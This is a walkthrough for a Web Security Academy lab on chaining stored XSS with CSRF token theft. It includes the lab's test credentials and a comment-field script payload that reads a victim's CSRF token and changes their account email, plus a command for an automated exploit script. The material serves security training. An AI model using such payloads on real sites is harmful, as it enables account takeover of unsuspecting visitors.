# XSS LAB 24 - Exploiting XSS to bypass CSRF defenses

## Manual Solution

### 1. Access the Lab.
- Open the Web Security Academy lab environment in your browser.

### 2. Logging in
- Log in with the username : `wiener` , password: `peter`.

### 3. Analyzing the update e-mail POST request.
- On the my account page open the network tab and update the email.
- Enter an email and update it.
- You should see a POST request to the endpoint `/my-account/change-email`.
- The POST request contains the `e-mail` and `csrf` payload. 

### 4. Creating a comment:
- Comment: `<script>alert('XSS')</script>`
- Name: `Anything`
- Email: `Anything@anything.com`
- Website: `https://www.anything.com`
- Submit to comment and an alert pop-up appears.
- This confirms that we can inject arbitrary JavaScript code.

### 5. Stealing csrf.
- We can inject and execute any JavaScript code we want.
- Create a comment
    - Name: `Anything`
    - Email: `Anything@anything.com`
    - Website: `https://www.anything.com`
    - Comment: 

    ```js
        <script>
            window.onload = function() {
                let csrf_token = document.getElementsByName("csrf")[0].getAttribute('value');

                let data = new FormData();;
                data.append('csrf', csrf_token);
                data.append('email', 'adsadassd@asafasadsd.com');
                
                fetch('https://[LAB_ID].web-security-academy.net/my-account/change-email', {
                    method: 'POST',
                    body: data
                });
            }
        </script>
    ```
    - When a victim visits the post page this JavaScript code automatically updates e-mail with stolen csrf.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_24.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
```